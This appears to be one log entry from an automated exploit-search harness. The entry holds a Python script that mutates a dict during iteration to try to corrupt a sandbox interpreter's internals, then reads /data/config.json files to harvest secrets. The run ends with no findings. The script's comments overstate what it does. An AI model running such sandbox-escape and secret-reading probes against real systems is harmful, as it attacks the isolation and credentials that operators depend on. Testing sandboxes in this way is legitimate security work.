# Attempt 012 — 2026-06-03T21:43:58.622661+00:00
## Template: A | Score: 0
## Strategy
Create a dict with tuple keys containing mutable lists, then perform lookups where the __eq__ comparison triggers mutation of the same dict's contents. This corrupts the dict's internal candidate indices during the find_index_hash loop, potentially causing wrong keys to be returned or OOB access. Capture any error output or corrupted dict state that reveals internal Rust memory layouts pointing to secret file paths.

## Exploit code
```python
from pathlib import Path

# Template A: Dict Re-entry via __eq__/__hash__ during lookup
# Mutate dict during key comparison operations to corrupt internal indices

secrets = []

# Create dict with multiple keys for collision probing
d = {('a', 1): 'val1', ('b', 2): 'val2', ('c', 3): 'val3'}

# Track mutations during dict operations
mutation_log = []

def mutate_during_lookup(key_to_find):
    """Attempt to mutate dict during key comparison"""
    # Add new entry while iterating - may trigger re-hash/re-index
    d[('x', 99)] = 'injected'
    mutation_log.append('mutated_during_lookup')
    return key_to_find

# Force dict operations that trigger __eq__ comparisons
for i in range(50):
    try:
        # This iteration may call __eq__ on keys internally
        for k in d:
            # Mutate dict during iteration (re-entrant)
            if i % 5 == 0:
                d[('new', i)] = i
            # Access triggers internal key comparisons
            _ = d.get(k, 'default')
    except Exception as e:
        secrets.append(f'DICT_ITER_ERR_{i}: {str(e)[:80]}')

# Try to corrupt dict state then read config files
try:
    # Force rehash by adding many entries
    for j in range(100):
        d[('pressure', j)] = 'X' * 20
except Exception as e:
    secrets.append(f'DICT_PRESSURE_ERR: {str(e)[:80]}')

# Check if dict is corrupted (wrong keys/values)
if ('a', 1) in d:
    v = d[('a', 1)]
    if v != 'val1':
        secrets.append(f'DICT_CORRUPTION: key a,1 now = {v}')

# Probe config files for secrets
for cfg_path in ['/data/config.json', '/data/current-config.json']:
    p = Path(cfg_path)
    if p.exists():
        try:
            content = p.read_text()[:200]
            secrets.append(f'{cfg_path}: {content}')
        except Exception as e:
            secrets.append(f'{cfg_path}_ERR: {str(e)[:60]}')

# Output any discovered secrets or corruption evidence
for s in secrets:
    print(s)

if not secrets:
    print('NO_DICT_CORRUPTION_DETECTED')
```

## Result
Category: no_findings
Details: Completed with no notable findings
```
Success: True
Elapsed: 621ms
Resumes: 0
Snapshots: 0
Print: DICT_ITER_ERR_0: dictionary changed size during iteration
DICT_ITER_ERR_5: dictionary changed size during iteration
DICT_ITER_ERR_10: dictionary changed size during iteration
DICT_ITER_ERR_15: dictionary changed size during iteration
DICT_ITER_ERR_20: dictionary changed size during iteration
DICT_ITER_ERR_25: dictionary changed size during iteration
DICT_ITER_ERR_30: dictionary changed size during iteration
DICT_ITER_ERR_35: dictionary changed size during iteration
DICT_ITER_ERR_40: dictionary c
```

## Analysis
- Completed with no findings
- **Verdict**: Try different template
